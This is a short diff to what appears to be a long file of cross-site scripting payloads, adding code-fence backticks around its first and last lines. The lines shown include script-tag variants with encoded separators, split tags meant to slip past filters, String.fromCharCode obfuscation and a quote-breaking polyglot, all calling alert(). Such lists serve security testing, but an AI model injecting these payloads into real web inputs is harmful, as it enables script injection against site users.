@@ -1,4 +1,4 @@
-<script\x20type="text/javascript">javascript:alert(1);</script>
+```<script\x20type="text/javascript">javascript:alert(1);</script>
 <script\x3Etype="text/javascript">javascript:alert(1);</script>
 <script\x0Dtype="text/javascript">javascript:alert(1);</script>
 <script\x09type="text/javascript">javascript:alert(1);</script>
@@ -2144,4 +2144,4 @@ foo<script>alert(1)</script>
 <scr<script>ipt>alert(1)</scr</script>ipt>
 <SCRIPT>String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)</SCRIPT>
 ';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
-<marquee onstart='javascript:alert('1');'>=(◕_◕)=
+<marquee onstart='javascript:alert('1');'>=(◕_◕)=```
